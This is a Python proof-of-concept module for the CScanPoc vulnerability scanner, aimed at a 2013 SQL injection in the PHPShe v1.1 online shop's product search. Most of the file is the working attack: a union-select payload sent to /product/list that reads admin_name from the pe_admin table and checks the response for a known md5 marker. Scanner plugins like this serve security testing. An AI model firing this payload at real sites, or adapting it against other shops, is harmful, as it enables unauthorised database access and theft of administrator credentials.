# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time


class Vuln(ABVuln):
    vuln_id = 'PHPShe_0002'  # 平台漏洞编号，留空
    name = 'PHPShe v1.1 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-04-12'  # 漏洞公布时间
    desc = '''
        PHPSHE网上商城系统具备电商零售业务所需的所有基本功能,以其安全稳定、简单易用、高效专业等优势赢得了用户的广泛好评,为用户提供了一个低成本、高效率的网上商城服务。
        PHPShe v1.1 product.php文件 搜索注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/15124.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPShe'  # 漏洞应用名称
    product_version = 'PHPShe v1.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd637952d-491a-4d8f-87c3-189874bd9b6f'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-12'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/product/list?keyword=kn1f3'+union+select+1,2,3,4,5,(select+concat(admin_name,0x27,md5(c),0x27)+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19 and+'1'='1"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，漏洞地址为{url}'.format(
                    target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
